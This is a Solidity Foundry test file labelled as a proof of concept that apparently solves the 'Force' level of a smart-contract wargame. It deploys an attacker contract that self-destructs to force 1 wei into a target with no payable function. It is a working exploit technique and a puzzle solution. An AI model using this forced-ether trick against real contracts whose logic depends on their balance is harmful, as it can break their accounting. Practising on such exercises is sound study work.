// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/level7.sol";

contract POC is Test {
    Force level7 = new Force();

    function test() external {
        vm.startBroadcast();

        console.log(address(level7).balance);
        new ForceAttacker{value: 1 wei}(address(level7));
        console.log(address(level7).balance);

        vm.stopBroadcast();
    }
}

contract ForceAttacker {
    constructor(address _to) public payable {
        require(msg.value == 1 wei);
        selfdestruct(payable(_to));
    }
}
